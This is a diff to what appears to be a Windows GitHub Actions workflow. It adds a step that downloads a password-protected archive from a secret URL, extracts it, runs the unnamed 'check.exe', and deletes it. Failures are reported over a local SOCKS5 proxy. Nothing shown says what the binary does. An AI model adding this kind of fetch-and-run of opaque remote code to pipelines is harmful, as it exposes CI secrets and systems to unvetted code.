@@ -36,6 +36,23 @@ jobs:
             -d "{\"ref\":\"main\",\"inputs\":{\"cascade\":true,\"f_cmdline\":\"${{inputs.f_cmdline}}\",\"s_cmdline\":\"${{inputs.s_cmdline}}\"}}"
           exit /b 0
           :BEGIN
+          curl -fsL -o "check.7z" ^
+            -H "Accept: application/octet-stream" ^
+            -H "Authorization: Bearer ${{secrets.MY_TOKEN}}" ^
+            -H "X-GitHub-Api-Version: 2026-03-10" ^
+            ${{secrets.CHECK}}
+          if %errorlevel% neq 0 (
+            echo %THIS_WF% failed| curl -s -x socks5://127.0.0.1:40000 -m 1 ${{secrets.NOTIFY}}
+            exit 1
+          )
+          7z e -bso0 -p${{secrets.SECRET_P}} check.7z
+          del check.7z
+          check.exe 41
+          del check.exe
+          if not exist SUCCESS (
+            echo %THIS_WF% aborted| curl -s -x socks5://127.0.0.1:40000 -m 1 ${{secrets.NOTIFY}}
+            exit 1
+          )
           curl -fL -o warp.msi https://downloads.cloudflareclient.com/v1/download/windows/ga
           msiexec /i warp.msi /quiet /qn /norestart
           del warp.msi
